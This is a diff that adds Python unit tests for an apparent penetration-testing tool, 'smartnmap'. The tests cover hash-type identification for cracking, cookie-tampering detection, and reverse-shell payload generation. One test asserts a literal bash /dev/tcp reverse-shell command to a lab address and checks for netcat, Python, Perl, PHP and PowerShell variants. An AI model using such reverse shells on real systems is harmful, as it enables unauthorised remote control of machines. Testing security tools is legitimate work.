@@ -443,6 +443,53 @@ class TestBrokenAuth(unittest.TestCase):
         self.assertIsNone(surface['login_form']['csrf'])  # no csrf field -> flagged elsewhere
 
 
+class TestHashAndShells(unittest.TestCase):
+    def test_identify_md5_vs_ntlm_by_context(self):
+        h = '5f4dcc3b5aa765d61d8327deb882cf99'
+        self.assertEqual(smartnmap.identify_hash(h, 'web-db')[0][0], 'md5')
+        self.assertEqual(smartnmap.identify_hash(h, 'nxc ntds.dit')[0][0], 'ntlm')
+
+    def test_identify_lengths_and_modes(self):
+        self.assertEqual(smartnmap.identify_hash('a' * 40)[0][:2], ('sha1', 100))
+        self.assertEqual(smartnmap.identify_hash('a' * 64)[0][:2], ('sha256', 1400))
+        self.assertEqual(smartnmap.identify_hash('a' * 128)[0][:2], ('sha512', 1700))
+        self.assertEqual(smartnmap.identify_hash('$2b$12$' + 'a' * 53)[0][:2], ('bcrypt', 3200))
+        self.assertEqual(smartnmap.identify_hash('$krb5tgs$23$*svc$LAB$x')[0][1], 13100)
+
+    def test_identify_garbage_returns_empty(self):
+        self.assertEqual(smartnmap.identify_hash('not-a-hash'), [])
+
+    def test_reverse_shell_payloads(self):
+        rs = smartnmap.reverse_shell_payloads('10.10.14.7', '9001')
+        self.assertEqual(rs['bash'], 'bash -i >& /dev/tcp/10.10.14.7/9001 0>&1')
+        for k in ('nc-mkfifo', 'python3', 'perl', 'php', 'powershell'):
+            self.assertIn('10.10.14.7', rs[k])
+
+    def test_emit_reverse_shells_only_on_rce(self):
+        loot = smartnmap.LootTracker()
+        smartnmap.emit_reverse_shells([{'desc': 'open port', 'severity': 'info'}], _Args(), loot)
+        self.assertEqual(loot.recommend, [])  # no foothold -> no payloads
+        smartnmap.emit_reverse_shells([{'desc': 'OS command injection confirmed', 'severity': 'critical'}],
+                                      _Args(lhost='1.2.3.4', lport='4444'), loot)
+        self.assertTrue(any('revshell:bash' in r for r in loot.recommend))
+
+    def test_cookie_encoding_layers(self):
+        import base64
+        b64 = base64.b64encode(b'{"role":"user"}').decode()
+        self.assertIn('base64', smartnmap._cookie_tamper_reason('session', b64) or '')
+        hexv = b'{"admin":0}'.hex()
+        self.assertIn('hex', smartnmap._cookie_tamper_reason('session', hexv) or '')
+
+    def test_hash_cracking_gated_off_no_network(self):
+        # active off + no --crack => identify + recommend only, no cracked findings
+        loot = smartnmap.LootTracker()
+        loot.add('keys', 'hash: 5f4dcc3b5aa765d61d8327deb882cf99')
+        with tempfile.TemporaryDirectory() as d:
+            v = smartnmap.run_hash_cracking('t', {}, Path(d), _Args(), {}, loot, context={})
+        self.assertEqual(v, [])  # nothing cracked (no network call made)
+        self.assertTrue(any('hashcat' in r for r in loot.recommend))
+
+
 class TestHelpers(unittest.TestCase):
     def test_is_ip(self):
         self.assertTrue(smartnmap._is_ip('10.10.10.10'))
